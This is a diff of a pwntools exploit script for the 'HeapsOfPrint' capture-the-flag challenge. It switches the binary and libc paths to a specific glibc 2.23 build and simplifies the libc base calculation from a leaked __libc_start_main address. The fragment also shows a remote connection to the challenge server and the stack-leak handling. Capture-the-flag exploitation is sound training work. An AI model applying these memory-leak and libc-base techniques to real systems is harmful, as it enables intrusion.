@@ -2,12 +2,12 @@
 # -*- coding: utf-8 -*-
 from pwn import *
 
-context(arch='amd64', os='linux', aslr=False, terminal=['tmux', 'neww'])
+context(arch='amd64', os='linux', terminal=['tmux', 'neww'])
 env = {}
 
 if args['GDB']:
     io = gdb.debug(
-        './HeapsOfPrint',
+        './HeapsOfPrint-amd64-2.23-0ubuntu9',
         env=env,
         gdbscript='''\
         b *0x5555555548a8
@@ -19,10 +19,10 @@ if args['GDB']:
     elf, libc = io.elf, io.libc
 elif args['REMOTE']:
     io = remote('flatearth.fluxfingers.net', 1747)
-    elf, libc = ELF('./HeapsOfPrint'), ELF('./libc.so.6')
+    elf, libc = ELF('./HeapsOfPrint'), ELF('libs/amd64/2.23/0ubuntu9/libc-2.23.so')
 else:
-    io = process('./HeapsOfPrint', env=env)
-    elf, libc = io.elf, io.libc
+    io = process('./HeapsOfPrint-amd64-2.23-0ubuntu9', env=env)
+    elf, libc = io.elf, ELF('libs/amd64/2.23/0ubuntu9/libc-2.23.so')
 
 # pwndbg> telescope 0x7fffffffed00
 # 00:0000│   0x7fffffffed00 —▸ 0x7fffffffed08 ◂— 0x0
@@ -81,12 +81,7 @@ success('a_stack_address: %s' % hex(a_stack_address))
 
 # receive the libc leak and compute the base address
 a_libc_address = int(io.recvn(14), 16)  # 0x7ffff7a303f1 (__libc_start_main+241)
-if args['REMOTE']:
-    # ./libc.so.6                       __libc_start_main+240
-    libc.address = a_libc_address - 0x0000000000020740 - 240
-else:
-    # ./libc6_2.24-9ubuntu2.2_amd64     __libc_start_main+241
-    libc.address = a_libc_address - 0x0000000000020300 - 241
+libc.address = a_libc_address - 0x0000000000020740 - 240
 success('libc.address: %s' % hex(libc.address))
 
 ###############################################################################
